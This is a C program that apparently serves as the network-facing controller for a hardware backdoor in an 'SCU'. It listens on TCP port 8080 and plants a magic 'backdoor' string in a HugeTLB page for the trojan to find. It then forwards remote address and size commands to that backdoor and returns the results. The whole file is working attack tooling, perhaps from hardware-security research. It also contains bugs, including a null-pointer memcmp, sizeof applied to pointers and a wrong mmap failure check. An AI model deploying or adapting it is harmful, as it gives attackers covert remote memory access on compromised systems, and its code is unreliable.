#include <arpa/inet.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define PORT 8080
#define HUGE_TLB_SIZE (0x200000)
#define INPUT_SIZE (4096)

const char *MAGIC_STR = "backdoor";
const char *CONNECTION_STR = "connected";

struct CommandStruct {
  char inst;
  int64_t addr;
  int64_t size;
  char input[INPUT_SIZE];
};

static struct CommandStruct *cmd;

int create_server_socket() {
  int serverSocket;
  struct sockaddr_in serverAddr;

  if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("Socket creation error");
    exit(EXIT_FAILURE);
  }

  memset(&serverAddr, 0, sizeof(serverAddr));

  serverAddr.sin_family = AF_INET;
  serverAddr.sin_addr.s_addr = INADDR_ANY;
  serverAddr.sin_port = htons(PORT);

  if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) <
      0) {
    perror("Binding error");
    exit(EXIT_FAILURE);
  }

  /* listen for incoming connections */
  if (listen(serverSocket, 5) < 0) {
    perror("Listening error");
    exit(EXIT_FAILURE);
  }

  return serverSocket;
}

void receive_command(int clientSocket) {
  char buffer[sizeof(struct CommandStruct)];
  memset(buffer, 0, sizeof(buffer));

  while (1) {
    /* receive command */
    ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesRead < 0) {
      perror("Receive error");
      exit(EXIT_FAILURE);
    }
    /* copy command to CommandStruct */
    memcpy(cmd, buffer, sizeof(buffer));
    /* backdoor will reset instr when done */
    while (!memcmp(cmd, 0, 1))
      ;
    /* return answer */
    send(clientSocket, cmd->input, sizeof(cmd->input), 0);
  }
}

int main() {
  /* create a server socket */
  int serverSocket = create_server_socket();

  /* mmap a HugeTLB for base pointer */
  cmd = mmap(NULL, 2048000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (cmd == NULL) {
    fprintf(stderr, "Failed to allocate memory for command struct.\n");
    return 1;
  }

  /* put magic string on base ptr so backdoor on SCU can find this HugeTLB */
  memcpy(cmd, MAGIC_STR, sizeof(MAGIC_STR));

  while (1) {
    /* SCU backdoor will write connected string into base ptr if found */
    if (!memcmp(cmd, CONNECTION_STR, sizeof(CONNECTION_STR))) {
      /* clean up magic string */
      memset(cmd, 0, sizeof(MAGIC_STR));

      int clientSocket;
      struct sockaddr_in clientAddr;
      socklen_t addrSize = sizeof(clientAddr);

      if ((clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr,
                                 &addrSize)) < 0) {
        perror("Accept error");
        exit(EXIT_FAILURE);
      }

      /* handle the connection, receive commands */
      receive_command(clientSocket);

      close(clientSocket);
    }
    sleep(1);
  }
  free((void *)cmd);
  close(serverSocket);
  return 0;
}
